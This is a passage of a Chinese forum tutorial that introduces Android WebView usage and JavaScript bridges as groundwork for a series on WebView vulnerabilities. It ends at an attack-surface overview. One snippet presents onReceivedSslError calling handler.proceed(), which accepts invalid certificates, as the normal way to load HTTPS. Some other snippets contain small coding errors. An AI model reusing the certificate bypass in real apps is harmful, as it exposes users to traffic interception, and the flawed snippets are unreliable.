#  Android APP 漏洞之战——WebView 漏洞详解   
随风而行aa  看雪学苑   2022-08-15 17:59  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qctjibXjV1p4iczia9kicBjGPJXopcQvGKcTAj6pzGsWGRyzNsia0YibXQTtg/640?wx_fmt=jpeg "")  
  
本文为看雪论坛精华文章  
  
看雪论坛作者ID：随风而行aa  
  
  
```
```  
  
  
今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。  
  
   
  
本文第二节讲述WebView的基本知识  
  
本文第三节讲述WebView的漏洞面  
  
本文第四节进行了漏洞原理介绍和漏洞复现  
  
   
  
本文从WebView开发出发，从0开始进行漏洞的讲解和复现，花了几天时间，列举了WebView中的20多种漏洞案例，并手动复现了其中十余种案例，希望用这篇万字长文介绍WebView漏洞的基本发展。  
  
  
```
```  
  
  
**1.WebView基础**  
  
****#### （1）WebView概述  
  
Android WebView在Android平台上是一个特殊的View，它能用来显示网页，这个WebView类可以被用来在app中仅仅显示一张在线的网页，还可以用来开发浏览器。  
  
   
  
WebView内部实现是采用渲染引擎(WebKit)来展示view的内容，提供网页前进后退、网页放大、缩小、搜索等功能。Android WebView 在低版本和高版本采用了不同的 webkit 版本内核，在 4.4 版本后使用 Chrome 内核。  
  
#### （2）WebView作用  
- 显示和渲染Web页面  
  
- 直接使用html文件（网络上或本地assets中）作布局  
  
- 可和JavaScript交互调用  
  
  
<table><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;white-space: unset;padding-left: 0px !important;border-color: unset !important;border-style: unset !important;border-width: unset !important;"><section style="text-align: left;margin-left: 16px;margin-right: 16px;"><span style="font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;">WebView控件功能强大，除了具有一般View的属性和设置外，还可以对url请求、页面加载、渲染、页面交互进行强大的处理。</span></section></td></tr></tbody></table>#### （3）WebView基础使用  
##### <1>本地加载  
  
Web最简单显示网页内容，基本步骤：  
  
1.在布局文件中添加WebView控件；  
  
2.在代码中让WebView控件加载显示网页。  
  
  
具体操作：  
  
首先，我们在布局文件中来添加WebView控件，如下：  
```
<WebView
    android:id="@+id/Wind_webview"
    android:layout_width="match_parent"
    android:layout_height="match_parent" />
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qIE9AdDCuUuEmDKO7Sjky76h1l017iaHZAicCib57vCyUCgXltoia2tGq3A/640?wx_fmt=png "")  
  
  
然后我们在代码中让WebView控件加载显示网页，如下：  
```
//获得控件
       WebView webView = (WebView) findViewById(R.id.Wind_webview);
       //访问网页
       webView.loadUrl("http://www.baidu.com");
       //系统默认会通过手机浏览器打开网页，为了能够直接通过WebView显示网页，则必须设置
       webView.setWebViewClient(new WebViewClient(){
           @Override
           public boolean shouldOverrideUrlLoading(WebView view, String url) {
               //使用WebView加载显示url
               view.loadUrl(url);
               //返回true
               return true;
           }
       });
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qaFDJTHjRtLKbDQ3YDc1ahTp4KzqmvKYnIeKJrlo7ZibKLUEYHkVEBEg/640?wx_fmt=png "")  
  
  
最后我们在配置文件中添加网络权限：  
```
<!-- 添加网络权限 -->
<uses-permission android:name="android.permission.INTERNET" />
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qYC6h6fZ48vjMmpj7eZs2ReibSJYzYMIq6ofqjtBYuVU2CjIBbVyp7oQ/640?wx_fmt=png "")  
  
运行程序，显示如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qaCyt9MhrbibicbVmR7CsGqYrtPwvwu16AhkQicuzveNR7OE1icSukic8ywQ/640?wx_fmt=png "")  
#####   
##### <2>远程加载  
  
首先，我们直接在本地新建js文件  
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Carson</title>
    <script>
         function callAndroid(){
            //由于对象映射，所以调用test对象等于调用Android映射的对象
            test.hello("WindXaa!");
         }
</script>
</head>
<body>
   <!--点击按钮则调用callAndroid函数-->
   <button type="button" id="button1" onclick="callAndroid()">Internet Click connect</button>
</body>
</html>
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0q9ticUD5UsjiaZbhoZHGib7mfAo5Q7aT63kSTnySzloXiaeEyl432AbW7vw/640?wx_fmt=png "")  
  
然后我们开启一个简易的http_server的监听：  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qcw3z15KK07ghc9OXtVkBwOHpibNA6Go2Dcc8k0u8pYpu9xpd9ibdZVuQ/640?wx_fmt=png "")  
  
我们编写代码：  
```
{
WebView mWebView = (WebView) findViewById(R.id.Wind_webview1);
WebSettings webSettings = mWebView.getSettings();

// 设置与Js交互的权限
webSettings.setJavaScriptEnabled(true);

// 通过addJavascriptInterface()将Java对象映射到JS对象
//参数1：Javascript对象名
//参数2：Java对象名
mWebView.addJavascriptInterface(new AndroidtoJs(), "test");//AndroidtoJS类对象映射到js的test对象
mWebView.loadData("","text/html",null);
// 加载JS代码
// 格式规定为:file:///android_asset/文件名.html
// mWebView.loadUrl("file:///android_asset/javascript.html");
mWebView.loadUrl("http://ip地址填自己的/attack.html");
}

    /**
 * 提供接口在Webview中供JS调用
 */
public class AndroidtoJs {
    // 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解
    @JavascriptInterface
    public void hello(String msg) {
        Log.e("WindXaa","Hello，" + msg);
    }
}
```  
  
  
然后我们再次运行程序：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qN3QNqRpdoO93Jic8pDSdr5Y9rOOJpNJ4MIdj8RKJexWhFpowVqAcD3A/640?wx_fmt=png "")  
  
   
  
这里就说明我们远程加载文件成功了，我们点击按钮：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qQJ8LL861ldHL65zo1ZDKvotQm4Nc71SwHNvkye0uMNlsJS8eRLeqIw/640?wx_fmt=png "")  
  
   
  
可以发现可以成功的通过JS调用Android代码。  
###   
###   
### 2.WebView使用详解  
####   
#### 1）WebView常用方法  
  
  
WebView的状态：  
webView.onResume();  
```
// 激活WebView为活跃状态，能正常执行网页的响应
```  
  
  
webView.onPause();  
```
// 当页面被失去焦点被切换到后台不可见状态，需要执行onPause
// 通过onPause动作通知内核暂停所有的动作，比如DOM的解析、plugin的执行、JavaScript执行。
```  
  
  
webView.pauseTimers()  
```
// 当应用程序(存在webview)被切换到后台时，这个方法不仅仅针对当前的webview而是全局的全应用程序的webview
// 它会暂停所有webview的layout，parsing，javascripttimer。降低CPU功耗。
```  
  
  
webView.resumeTimers()  
```
// 恢复pauseTimers状态
```  
  
  
rootLayout.removeView(webView)  
  
   
  
webView.destory()  
```
// webview调用destory时，webview仍绑定在Activity上
// 需要先从父容器中移除webview，然后再销毁webview
```  
  
  
前进、后退网页  
```
//是否可以后退
Webview.canGoBack()

//后退网页
Webview.goBack()

//是否可以前进
Webview.canGoForward()

//前进网页
Webview.goForward()

//以当前的index为起始点前进或者后退到历史记录中指定的steps
//如果steps为负数则为后退，正数则为前进
Webview.goBackOrForward(intsteps)
```  
  
  
在不做任何处理前提下，浏览网页时点击系统的“Back”键时，整个 Browser 会调用 finish()而结束自身，因此需要在当前Activity中处理并消费掉该 Back 事件，当按下返回键时，调用goBack方法。  
  
   
  
我们可以做一些处理，让点击“Back”键后，让网页返回上一页而不是直接退出浏览器，此时我们可以在当前的Activity中处理Back事件，如下：  
```
public boolean onKeyDown(int keyCode, KeyEvent event) {
    if ((keyCode == KEYCODE_BACK) && mWebView.canGoBack()) {
         mWebView.goBack();

         return true;

    }

    return super.onKeyDown(keyCode, event);

}
```  
  
  
清除缓存数据  
```
//清除网页访问留下的缓存
//由于内核缓存是全局的因此这个方法不仅仅针对webview而是针对整个应用程序.
Webview.clearCache(true);

//清除当前webview访问的历史记录
//只会webview访问历史记录里的所有记录除了当前访问记录
Webview.clearHistory()；

//这个api仅仅清除自动完成填充的表单数据，并不会清除WebView存储到本地的数据
Webview.clearFormData()；
```  
####   
#### （2）常用类  
##### <1>WebSettings类  
  
作用：对WebView进行配置和管理  
  
   
  
配置步骤：  
  
第一步：添加访问网络权限（AndroidManifest.xml）  
```
<uses-permission android:name="android.permission.INTERNET"/>
```  
  
  
注意：从Android 9.0（API级别28）开始，默认情况下禁用明文支持，会显示 ERR_CLEARTEXT_NOT_PERMITTED。因此http的url均无法在webview中加载，可以在manifest中application节点添加android:usesCleartextTraffic="true"。  
  
   
  
第二步：生成一个WebView组件（有两种方式）  
```
//方式1：直接在在Activity中生成
WebView webView = new WebView(this)

//方法2：在Activity的layout文件里添加webview控件：
WebView webview = (WebView) findViewById(R.id.webView1);
```  
  
  
第三步：进行配置-利用WebSettings子类（常见方法）  
```
//声明WebSettings子类
WebSettings webSettings = webView.getSettings();

//如果访问的页面中要与Javascript交互，则webview必须设置支持Javascript
webSettings.setJavaScriptEnabled(true);

//支持插件
webSettings.setPluginsEnabled(true);

 //设置自适应屏幕，两者合用
webSettings.setUseWideViewPort(true); //将图片调整到适合webview的大小
webSettings.setLoadWithOverviewMode(true); // 缩放至屏幕的大小

//缩放操作
webSettings.setSupportZoom(true); //支持缩放，默认为true。是下面那个的前提。
webSettings.setBuiltInZoomControls(true); //设置内置的缩放控件。若为false，则该WebView不可缩放
webSettings.setDisplayZoomControls(false); //隐藏原生的缩放控件

//其他细节操作
webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); //关闭webview中缓存
webSettings.setAllowFileAccess(true); //设置可以访问文件
webSettings.setJavaScriptCanOpenWindowsAutomatically(true); //支持通过JS打开新窗口
webSettings.setLoadsImagesAutomatically(true); //支持自动加载图片
webSettings.setDefaultTextEncodingName("utf-8");//设置编码格式
```  
  
  
常见方法：设置WebView缓存  
- 当加载 html 页面时，WebView会在/data/data/包名目录下生成 database 与 cache 两个文件夹  
  
- 请求的 URL记录保存在 WebViewCache.db，而 URL的内容是保存在 WebViewCache 文件夹下  
  
- 是否启用缓存：  
  
```
//优先使用缓存
WebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);

//缓存模式如下：
    //LOAD_CACHE_ONLY: 不使用网络，只读取本地缓存数据
    //LOAD_DEFAULT: （默认）根据cache-control决定是否从网络上取数据。
    //LOAD_NO_CACHE: 不使用缓存，只从网络获取数据.
    //LOAD_CACHE_ELSE_NETWORK，只要本地有，无论是否过期，或者no-cache，都使用缓存中的数据

//不使用缓存
WebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
```  
#####   
##### <2>WebViewClient类  
  
用来处理各种通知 & 请求事件  
  
   
  
shouldOverrideUrlLoading()  
  
   
  
作用：打开网页时不调用系统浏览器， 而是在本WebView中显示；在网页上的所有加载都经过这个方法,这个函数我们可以做很多操作。  
```
//Webview控件
Webview webview = (WebView) findViewById(R.id.webView);

//加载一个网页
webView.loadUrl("http://www.google.com/");

//重写shouldOverrideUrlLoading()方法，使得打开网页时不调用系统浏览器， 而是在本WebView中显示
webView.setWebViewClient(new WebViewClient(){
     @Override

     public boolean shouldOverrideUrlLoading(WebView view, String url) {
           view.loadUrl(url);

           return true;

      }

});
```  
  
  
onPageStarted()  
  
   
  
作用：开始载入页面调用的，我们可以设定一个loading的页面，告诉用户程序在等待网络响应。  
```
webView.setWebViewClient(new WebViewClient(){
     @Override
     public void  onPageStarted(WebView view, String url, Bitmap favicon) {
        //设定加载开始的操作
     }
 });
```  
  
  
onLoadResource()  
  
   
  
作用：在加载页面资源时会调用，每一个资源（比如图片）的加载都会调用一次。  
```
webView.setWebViewClient(new WebViewClient(){
      @Override
      public boolean onLoadResource(WebView view, String url) {
         //设定加载资源的操作
      }
  });
```  
  
  
onReceivedError（）  
  
   
  
作用：加载页面的服务器出现错误时（如404）调用。  
  
   
  
App里面使用webview控件的时候遇到了诸如404这类的错误的时候，若也显示浏览器里面的那种错误提示页面就显得很丑陋了，那么这个时候我们的app就需要加载一个本地的错误提示页面，即webview如何加载一个本地的页面。  
```
//步骤1：写一个html文件（error_handle.html），用于出错时展示给用户看的提示页面
//步骤2：将该html文件放置到代码根目录的assets文件夹下

//步骤3：复写WebViewClient的onRecievedError方法
//该方法传回了错误码，根据错误类型可以进行不同的错误分类处理
    webView.setWebViewClient(new WebViewClient(){
      @Override
      public void onReceivedError(WebView view, int errorCode, String description, String failingUrl){
switch(errorCode)
                {
                case HttpStatus.SC_NOT_FOUND:
                    view.loadUrl("file:///android_assets/error_handle.html");
                    break;
                }
            }
        });
```  
  
  
onReceivedSslError()  
  
   
  
作用：处理https请求  
  
   
  
webView默认是不处理https请求的，页面显示空白，需要进行如下设置：  
```
webView.setWebViewClient(new WebViewClient() {   
        @Override   
        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {   
            handler.proceed();    //表示等待证书响应
        // handler.cancel();      //表示挂起连接，为默认方式
        // handler.handleMessage(null);    //可做其他处理
        }   
    });
```  
  
  
c.WebChromeClient  
  
   
  
作用：辅助 WebView 处理 Javascript 的对话框,网站图标,网站标题等等。  
  
   
  
onProgressChanged（）  
  
   
  
作用：获得网页的加载进度并显示  
```
webview.setWebChromeClient(new WebChromeClient(){

      @Override
      public void onProgressChanged(WebView view, int newProgress) {
          if (newProgress < 100) {
              String progress = newProgress + "%";
              progress.setText(progress);
            } else {
        }
    });
```  
  
  
onReceivedTitle（）  
  
   
  
作用：获取Web页中的标题  
  
   
  
每个网页的页面都有一个标题，比如www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？  
```
webview.setWebChromeClient(new WebChromeClient(){

    @Override
    public void onReceivedTitle(WebView view, String title) {
       titleview.setText(title)；
    }
```  
  
#### （3）WebView与JS的交互  
  
Android WebView与JS的交互：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qiaH0KlwTjyV4X33CWkfCegFAibaQwRoSc5OD6ibc3vtoHiblU0ax3TOaIA/640?wx_fmt=png "")  
#####   
##### <1>Android调用JS  
  
WebView.loadUrl()  
  
   
  
首先，准备html文件，放到assets中  
```
<html>
<head>
    <meta charset="utf-8">
    <title>测试</title>
    <script>
        function callJS(){
            alert("Android调用了JS的callJS方法");
        }
</script>
</head>

<body>
<h1>Android调用JS方法测试</h1>
</body>
</html>
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qRSZEiaic4n726D3Yx6rc9H0pcfyOVibArKWEu7R3Pj3DHg9YyNNfnLuRw/640?wx_fmt=png "")  
  
然后在Java层中添加代码，进行调用JS文件以及JS中的方法：  
```
// 设置与Js交互的权限
 webSettings.setJavaScriptEnabled(true);
 // 设置允许JS弹窗
 webSettings.setJavaScriptCanOpenWindowsAutomatically(true);

 // 先载入JS代码
 // 格式规定为:file:///android_asset/文件名.html
 mWebView.loadUrl("file:///android_asset/AndroJs.html");

 Button button = (Button) findViewById(R.id.button);
 button.setOnClickListener(new View.OnClickListener() {
     @Override
     public void onClick(View v) {
         // 通过Handler发送消息
         mWebView.post(new Runnable() {
             @Override
             public void run() {

                 // 注意调用的JS方法名要对应上
                 // 调用javascript的callJS()方法
                 mWebView.loadUrl("javascript:callJS()");
             }
         });

     }
 });

 // 由于设置了弹窗检验调用结果,所以需要支持js对话框
 // webview只是载体，内容的渲染需要使用webviewChromClient类去实现
 // 通过设置WebChromeClient对象处理JavaScript的对话框
 //设置响应js 的Alert()函数
 mWebView.setWebChromeClient(new WebChromeClient() {
     @Override
     public boolean onJsAlert(WebView view, String url, String message, final JsResult result) {
         AlertDialog.Builder b = new AlertDialog.Builder(MainActivity.this);
         b.setTitle("Alert");
         b.setMessage(message);
         b.setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
             @Override
             public void onClick(DialogInterface dialog, int which) {
                 result.confirm();
             }
         });
         b.setCancelable(false);
         b.create().show();
         return true;
     }

 });
```  
  
  
效果演示：  
  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qDPd2AHr1Eb8OnlWLSLmBemC2NMpVxC9aXDsazQl3ibbatVtnfaKud9w/640?wx_fmt=png "")  
  
  
   
  
我们可以发现程序成功的加载了html文件，然后我们点击按钮去调用js中的方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qNzibVssOlOf9nePqnXt2nvKyv1H78gP86JfOh9dfDwaMhku3tgIZpPw/640?wx_fmt=png "")  
  
   
  
这里就成功的通过loadUrl进行了调用。  
  
  
特别注意：JS代码调用一定要在 onPageFinished（） 回调之后才能调用，否则不会调用。  
```
onPageFinished()属于WebViewClient类的方法，主要在页面加载结束时调用
```  
  
  
WebView.evaluateJavascript()  
  
   
  
优点：该方法比第一种方法效率更高、使用更简洁  
```
因为该方法的执行不会使页面刷新，而第一种方法（loadUrl ）的执行则会。
Android 4.4 后才可使用
```  
  
  
具体使用：  
```
//使用evaluateJavascript来加载
mWebView.evaluateJavascript("javascript:callJS()", new ValueCallback<String>() {
    @Override
    public void onReceiveValue(String value) {
        //此处为 js 返回的结果
    }
});
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qiaA4P73j2qGNgt0fpE8vqt3XSZoneCQ9ibg4GcLrDCMYUsE9A2veS5icQ/640?wx_fmt=png "")  
  
同样加载成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qf48Ino6XibvVrG1ObAgfnSXd9jxsfZ3pXJFFVUiazQz25c6Xm0pAxb0w/640?wx_fmt=png "")  
#####   
##### <2>JS调用Android  
  
addJavascriptInterface  
  
   
  
首先，准备html文件，放到assets中  
```
//JS调用Android
<html>
<head>
    <meta charset="utf-8">
    <title>Carson</title>
    <script>
         function callAndroid(){
            //由于对象映射，所以调用test对象等于调用Android映射的对象
            test.hello("WindXaa js调用了android中的hello方法");
         }
</script>
</head>
<body>
<!--点击按钮则调用callAndroid函数-->
<button type="button" id="button1" onclick="callAndroid()">Click Attack</button>
</body>
</html>
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qE4cpwuThJA0Im8nUHtiazEbtkCzJ3vxyIZzVFphcibhLtD4UjibM83RCg/640?wx_fmt=png "")  
  
  
然后加载调用：  
```
public class JsToAndroActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_js_to_andro);

        WebView mWebView = (WebView) findViewById(R.id.Wind_webview1);
        WebSettings webSettings = mWebView.getSettings();

        // 设置与Js交互的权限
        webSettings.setJavaScriptEnabled(true);

        // 通过addJavascriptInterface()将Java对象映射到JS对象
        //参数1：Javascript对象名
        //参数2：Java对象名
        mWebView.addJavascriptInterface(new AndroidtoJs(), "test");//AndroidtoJS类对象映射到js的test对象

        // 加载JS代码
        // 格式规定为:file:///android_asset/文件名.html
        mWebView.loadUrl("file:///android_asset/javascript.html");


    }

    /**
     * 提供接口在Webview中供JS调用
     */
    public class AndroidtoJs {
        // 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解
        @JavascriptInterface
        public void hello(String msg) {
            Log.e("WindXaa","Hello，" + msg);
        }
    }
}
```  
  
  
然后我们切换到第二个测试用例：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qfUfa46Bh9F2IeAYu6QH3atcSTKYra1Grrt0icZKWWngsCupxicAlwj8w/640?wx_fmt=png "")  
  
直接点击：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qB7Fk58JYeWsIMKAKTldnz4ucCMrYJkID5ibgBax36wGia61xzxvWN0RA/640?wx_fmt=png "")  
  
此时已经成功的加载了我们的JS，我们点击按钮：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qotIhL19krT3WVemicbVaosYbU1ZdBiaibFd7KccVH8UzGloJLWPGL4whQ/640?wx_fmt=png "")  
  
   
  
js中就成功的加载了Android中的hello方法。  
  
   
  
WebViewClient.shouldOverrideUrlLoading ()  
  
   
  
具体原理：  
```
(1)Android通过 WebViewClient 的回调方法shouldOverrideUrlLoading ()拦截 url
(2)解析该 url 的协议
(3)如果检测到是预先约定好的协议，就调用相应方法
```  
  
  
即JS需要调用Android的方法  
  
   
  
具体使用：  
首先，在JS中约定所需要的Url协议，以.html格式放到src/main/assets文件夹里。  
```
<html>

<head>
    <meta charset="utf-8">
    <title>Carson_Ho</title>

    <script>
         function callAndroid(){
            /*约定的url协议为：js://webview?arg1=WindXaa&arg2=attack*/
            document.location = "js://webview?arg1=WindXaa&arg2=attack";
         }
</script>
</head>

<!-- 点击按钮则调用callAndroid（）方法  -->
<body>
<button type="button" id="button1" onclick="callAndroid()">点击调用Android代码</button>
</body>
</html>
```  
  
  
然后我们新建一个类，并编写代码：  
```
     WebView mWebView = (WebView) findViewById(R.id.Wind_webview2);

        WebSettings webSettings = mWebView.getSettings();

        // 设置与Js交互的权限
        webSettings.setJavaScriptEnabled(true);
        // 设置允许JS弹窗
        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);

        // 步骤1：加载JS代码
        // 格式规定为:file:///android_asset/文件名.html
        mWebView.loadUrl("file:///android_asset/javascript1.html");


// 复写WebViewClient类的shouldOverrideUrlLoading方法
        mWebView.setWebViewClient(new WebViewClient() {
                                      @Override
                                      public boolean shouldOverrideUrlLoading(WebView view, String url) {

                                          // 步骤2：根据协议的参数，判断是否是所需要的url
                                          // 一般根据scheme（协议格式） & authority（协议名）判断（前两个参数）
                                          //约定的url协议为：js://webview?arg1=WindXaa&arg2=attack（同时也是约定好的需要拦截的）

                                          Uri uri = Uri.parse(url);
                                          // 如果url的协议 = 预先约定的 js 协议
                                          // 就解析往下解析参数
                                          if ( uri.getScheme().equals("js")) {

                                              // 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议
                                              // 所以拦截url,下面JS开始调用Android需要的方法
                                              if (uri.getAuthority().equals("webview")) {

                                                  //  步骤3：
                                                  // 执行JS所需要调用的逻辑
                                                  System.out.println("js调用了Android的方法");
                                                  // 可以在协议上带有参数并传递到Android上
                                                  HashMap<String, String> params = new HashMap<>();
                                                  Set<String> collection = uri.getQueryParameterNames();
                                                  Log.e("WindXaa",params.get(0)+"---"+params.get(1));


                                              }

                                              return true;
                                          }
                                          return super.shouldOverrideUrlLoading(view, url);
                                      }
                                  }
        );
```  
  
  
运  
行程序：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qPQgyHXCmRD31MHiazgHFWq46ia5hokV3plkEgIib5eKeAZHj5feqIEAvQ/640?wx_fmt=png "")  
  
   
  
这里就调用Android代码成功。  
  
   
  
WebChromeClient 的onJsAlert()、onJsConfirm()、onJsPrompt（）  
  
   
  
在JS中，上面三种方法分别回调l拦截对话框alert()、confirm()、prompt()的信息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0q8xN12aLNbJtibia1sWCibxeUsTe7GKGo1Dm8zHbkJNicfoaUScFhwicTXdQ/640?wx_fmt=png "")  
  
   
  
Android通过 WebChromeClient 的onJsAlert()、onJsConfirm()、onJsPrompt（）方法回调分别拦截JS对话框（即上述三个方法），得到他们的消息内容，然后解析即可。  
  
   
  
然后我们再次编写js代码：  
```
<html>
<head>
    <meta charset="utf-8">
    <title>Carson_Ho</title>

    <script>

    function clickprompt(){
    // 调用prompt（）
    var result=prompt("js://webview?arg1=WindXaa&arg2=attack");
    alert("demo " + result);
}
</script>
</head>

<!-- 点击按钮则调用clickprompt()  -->
<body>
<button type="button" id="button1" onclick="clickprompt()">点击调用Android代码</button>
</body>
</html>
```  
  
  
我们编写onJsPrompt 回调方法：  
```
WebView mWebView = (WebView) findViewById(R.id.Wind_webview3);

      WebSettings webSettings = mWebView.getSettings();

      // 设置与Js交互的权限
      webSettings.setJavaScriptEnabled(true);
      // 设置允许JS弹窗
      webSettings.setJavaScriptCanOpenWindowsAutomatically(true);

      // 先加载JS代码
      // 格式规定为:file:///android_asset/文件名.html
      mWebView.loadUrl("file:///android_asset/javascript2.html");


      mWebView.setWebChromeClient(new WebChromeClient() {
          // 拦截输入框(原理同方式2)
          // 参数message:代表promt（）的内容（不是url）
          // 参数result:代表输入框的返回值
          @Override
          public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {
              // 根据协议的参数，判断是否是所需要的url(原理同方式2)
              // 一般根据scheme（协议格式） & authority（协议名）判断（前两个参数）

              Uri uri = Uri.parse(message);
              // 如果url的协议 = 预先约定的 js 协议
              // 就解析往下解析参数
              if (uri.getScheme().equals("js")) {
                  //js://webview?arg1=WindXaa&arg2=attack
                  // 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议
                  // 所以拦截url,下面JS开始调用Android需要的方法
                  if (uri.getAuthority().equals("webview")) {

                      // 执行JS所需要调用的逻辑
                      System.out.println("js调用了Android的方法");
                      // 可以在协议上带有参数并传递到Android上
                      HashMap<String, String> params = new HashMap<>();
                      Set<String> collection = uri.getQueryParameterNames();

                      //参数result:代表消息框的返回值(输入值)
                      result.confirm("js调用了Android的方法成功啦");
                  }
                  return true;
              }
              return super.onJsPrompt(view, url, message, defaultValue, result);
          }
      });
```  
  
  
运行程序：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0q3RPiaZh2NGNFfzhZmZD0vice5mMibx6aeTDBeVqU6aUtXNxeF1icILCBHQ/640?wx_fmt=png "")  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qSn4CQQcccgqFRtsNVP1IMcKARjUyweFFfLXODQENZuVo86USqHBVjQ/640?wx_fmt=png "")  
  
   
  
我们可以发现这里已经成功的加载了html，然后我们再次点击按钮可以发现通过回调成功的调用了函数，并且显示了弹窗。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qJXXgqiaXskMcrRCD6iccFlPVXhatxk312tCj9icut36JTJdEGFjX80gEA/640?wx_fmt=png "")  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qtq7z34M7VibfKYp2SKRzypS4Gst4q6NTZazS1GndMKPXYhmumtpISPw/640?wx_fmt=png "")  
  
   
  
其余两种方法同理：  
```
// 拦截JS的警告框
@Override
public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
    return super.onJsAlert(view, url, message, result);
}

// 拦截JS的确认框
@Override
public boolean onJsConfirm(WebView view, String url, String message, JsResult result) {
    return super.onJsConfirm(view, url, message, result);
}
```  
  
  
##   
```
```  
  
  
WebView 漏洞在Android APP中占比十分巨大，根据梆梆安全的《2021年移动安全形势分析与2022年研判》中显示，WebView漏洞总和仍然占据目前Android APP漏洞类别前列，如下图所示：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qw7VUPiaLb3A9zTzmYicia73CiaLbuicibhVBNKbTt7ORaMS1H6wKLAezTFXQ/640?wx_fmt=png "")  
  
   
因此了解和掌握WebView漏洞的原理和技巧是十分重要的。  
  
### 1.WebView的漏洞面  
  
****  
谈起WebView漏洞，我们的目光回退到2020年看雪SDC沙龙会议中，来自OPPO实验室的何恩大佬发表的《Android WebView安全攻防指南2020》的演讲，大佬从WebView的本地攻击面、远程攻击面、特殊攻击面共3个角度讲述了WebView漏洞的成因，原文链接：Android WebView安全攻防指南2020，这里引用大佬的WebView示例图，如下图所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0quiboRg9SEVLAGsibkue7bxQSwfNsBRNwlnYaLYu3JXarkicvZT3FZSIVA/640?wx_fmt=png "")  
  
  
从图中我们可以看出WebView的漏洞攻击面，从引导组件Intent、deeplink，包括了WebView自身的接口，以及一些端口协议等等攻击面  
###   
### 2.WebView漏洞发展总结  
  
****  
考虑到WebView漏洞的攻击面十分的杂乱，这里我对WebView漏洞的发展进行了一个梳理总结，如下所示：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0qp4MpZTKIV9pfib2icNatXg0uVwqDNk863ON0E4FibgLXZH1I2FYZQeYicw/640?wx_fmt=png "")  
  
   
  
下面我们就将一一的讲解每个漏洞的原理并进行复现  
##   
